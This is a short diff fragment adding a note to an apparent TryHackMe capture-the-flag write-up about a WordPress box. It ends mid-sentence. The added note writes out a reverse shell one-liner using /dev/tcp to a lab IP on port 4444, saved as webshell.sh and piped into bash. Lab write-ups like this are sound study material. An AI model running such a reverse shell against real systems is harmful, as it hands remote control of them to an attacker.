@@ -400,3 +400,6 @@ define( 'DB_COLLATE', '' );
 
 ![](../THM%20Challenge%20Rooms%20-%20Red%20Easy/Obsidian%20assets/Smolwhoami.png)
 
+> [!note]
+> Took a little while to figure this out but got there in the end.
+> First create a txt file for the rev shell called webshell.sh and got a little help generating the script for it with rev shell generator and AI: sh -i >& /dev/tcp/192.168.148.210/4444 0>&1 which was then piped into bash to as
